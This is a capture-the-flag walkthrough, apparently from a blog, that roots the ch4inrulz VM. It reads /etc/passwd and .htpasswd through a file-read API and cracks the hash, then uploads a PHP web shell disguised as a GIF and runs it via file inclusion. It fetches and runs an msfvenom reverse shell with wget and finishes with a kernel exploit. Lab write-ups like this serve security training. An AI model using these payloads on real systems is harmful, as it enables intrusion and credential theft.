## Background

Frank has a small website, and he is a smart developer with a normal security background; he always loves to follow patterns. Your goal is to discover any critical vulnerabilities and gain access to the system. Ultimately, you need to gain root access to capture the root flag.

## Information Gathering

```
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.20.130

```

`nmap` finds `21/tcp`, `22/tcp`, `80/tcp`, and `8011/tcp` open. Since FTP allows anonymous login, let's check that first.

![77826fb7.png](/assets/images/posts/ch4inrulz-1.0.1-walkthrough/77826fb7.png)

Hmm. Nothing interesting to explore.

## Frank's Website

OK. Frank's website is up next.

![2bafdde5.png](/assets/images/posts/ch4inrulz-1.0.1-walkthrough/2bafdde5.png)

I must say the design looks good. Clean and simple.

Now, let's use `dirb` to bust some directories. `80/tcp` goes first.

`/development/` needs credential.

`/api/` has some interesting information.

![89bd5517.png](/assets/images/posts/ch4inrulz-1.0.1-walkthrough/89bd5517.png)

In particular, `/api/files_api.php` exists.

![23727c34.png](/assets/images/posts/ch4inrulz-1.0.1-walkthrough/23727c34.png)

I found out that `/api/files_api.php` is able to read files through `POST` requests. To that end, I wrote a script to `cat` files which I have read permissions.

<div class="filename"><span>files.sh</span></div>

```bash
#!/bin/bash

HOST=192.168.20.130
API=api/files_api.php
PORT=8011
FILE=$1

curl -s -d "file=$FILE" "http://$HOST:$PORT/$API" \
| sed -e '6,$!d' -e '$d'
```

Let's read `/etc/passwd`.

![2dd01c7a.png](/assets/images/posts/ch4inrulz-1.0.1-walkthrough/2dd01c7a.png)

Not bad. There's a `frank` account and `www-data`'s home directory is at `/var/www`.

Now, let's read `/var/www/development/.htaccess`.

![b238d228.png](/assets/images/posts/ch4inrulz-1.0.1-walkthrough/b238d228.png)

`.htpasswd` is at somewhere else. Let's read that as well.

![389de4b4.png](/assets/images/posts/ch4inrulz-1.0.1-walkthrough/389de4b4.png)

I'm going to save `.htpasswd` and send it to John the Ripper for offline cracking.

![8129131e.png](/assets/images/posts/ch4inrulz-1.0.1-walkthrough/8129131e.png)

Time to access `/development/` and see what we got there.

![9c27747b.png](/assets/images/posts/ch4inrulz-1.0.1-walkthrough/9c27747b.png)

No surprise, the "uploader tool" is at `/development/uploader/`.

![00044006.png](/assets/images/posts/ch4inrulz-1.0.1-walkthrough/00044006.png)

Here's what I observed about the "uploader tool":

+ Checks image file extension for JPG, JPEG, PNG, and GIF.
+ Checks the associated image MIME type

I crafted the following file to bypass the checks and to upload.

```
# cat cmd.php.gif
GIF89a;
<?php echo shell_exec($_GET['cmd']); ?>
```

OK. I manage to upload the file. But where's the upload path?

![2c64ed92.png](/assets/images/posts/ch4inrulz-1.0.1-walkthrough/2c64ed92.png)

I've tried the following paths with no success:

+ `/uploader/upload`
+ `/uploader/uploads`
+ `/uploader/myupload`
+ `/uploader/myuploads`
+ `/uploader/my-upload`
+ `/uploader/my-uploads`
+ `/uploader/my_upload`
+ `/uploader/my_uploads`

Then I had an epiphany. What if the word 'my' refers to Frank? I tried all the permutations of "Frank" until I hit the one seen here.

![d813c697.png](/assets/images/posts/ch4inrulz-1.0.1-walkthrough/d813c697.png)

Sneaky bastard, this Frank.

## Low-Privilege Shell

This is where I hit another road block. Somehow, the web server is refusing to load PHP at `/development/uploader`.

![8aa3a2cd.png](/assets/images/posts/ch4inrulz-1.0.1-walkthrough/8aa3a2cd.png)

No luck even with `curl`.

```
# curl -u 'frank:frank!!!' http://192.168.20.130/development/uploader/FRANKuploads/cmd.php.gif?cmd=id
GIF89a;
<?php echo shell_exec($_GET['cmd']); ?>
```

Wait a minute. Back up. When's the last time I saw PHP loaded? At `8011/tcp` with `/api/files_api.php`!

Perhaps I can re-purpose `cat.sh` to something like this.

<div class="filename"><span>cmd.sh</span></div>

```bash
#!/bin/bash

HOST=192.168.20.130
API=api/files_api.php
PORT=8011
FILE=/var/www/development/uploader/FRANKuploads/cmd.php.gif
CMD=$(echo -n "$1" \
      | xxd -p \
      | tr -d '\n' \
      | sed -r 's/(..)/%\1/g')

curl -s -d "file=$FILE" "http://$HOST:$PORT/$API/?cmd=$CMD" \
| sed -e '6,$!d' -e '$d' \
| sed 1d
```

Let's give it a shot.

```
# ./cmd.sh id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```
# ./cmd.sh "uname -a"
Linux ubuntu 2.6.35-19-generic #28-Ubuntu SMP Sun Aug 29 06:34:38 UTC 2010 x86_64 GNU/Linux
```

```
# ./cmd.sh "lsb_release -a"
Distributor ID:	Ubuntu
Description:	Ubuntu maverick (development branch)
Release:	10.10
Codename:	maverick
```

Too bad the VM has the traditional `nc` or BSD `nc`. Otherwise, we could have gotten a reverse shell with `nc`. Nonetheless, we can transfer a reverse shell over since `wget` is available.

On the attacking machine, generate a reverse shell with `msfvenom`.

```
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.20.128 LPORT=1234 -f elf -o rev
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: rev
```

Next, host the reverse shell with Python's SimpleHTTPServer module.

```
# python -m SimpleHTTPServer 80
```

Using `cmd.sh`, run this command.

```
# ./cmd.sh "wget -O /tmp/rev 192.168.20.128/rev"
```

![b7722a6c.png](/assets/images/posts/ch4inrulz-1.0.1-walkthrough/b7722a6c.png)

The transfer is successful. Next, make `/tmp/rev` executable.

```
# ./cmd.sh "chmod +x /tmp/rev"
# ./cmd.sh "ls -l /tmp/rev"
-rwxr-xr-x 1 www-data www-data 194 Sep  2 10:06 /tmp/rev
```

Lastly, before we run the reverse shell, we need to set up our `nc` listener to catch it on the attacking machine.

```
# ./cmd.sh /tmp/rev
```

![8766d43e.png](/assets/images/posts/ch4inrulz-1.0.1-walkthrough/8766d43e.png)

Before I forget, here's the `user` flag at `/home/frank/user.txt`.

![3ce1f4bc.png](/assets/images/posts/ch4inrulz-1.0.1-walkthrough/3ce1f4bc.png)

## Privilege Escalation

If you have noticed the kernel version, you realized how old the kernel is. What does that mean for us? Local privilege escalation exploit! Let's use `searchsploit` to find a relevant exploit.

![62634bb3.png](/assets/images/posts/ch4inrulz-1.0.1-walkthrough/62634bb3.png)

I've chosen the 'RDS Protocol' local privilege escalation exploit. It's relevant to the kernel and seems independent of the distribution. More importantly, it's a simple and easy-to-understand exploit.

Now, how do I transfer the exploit source code over? Through `wget` and Python's SimpleHTTPServer module of course. I'm also fortunate enough to have `gcc` available in the VM.

Let's do this \o/

![d2e7f948.png](/assets/images/posts/ch4inrulz-1.0.1-walkthrough/d2e7f948.png)

What a bummer! :unamused:

![cbf4dca2.png](/assets/images/posts/ch4inrulz-1.0.1-walkthrough/cbf4dca2.png)

Nothing is going to stop me :triumph:

![43baf8c0.png](/assets/images/posts/ch4inrulz-1.0.1-walkthrough/43baf8c0.png)

`root` at last!

![cacb6659.png](/assets/images/posts/ch4inrulz-1.0.1-walkthrough/cacb6659.png)

Getting the `root` flag is one command away.
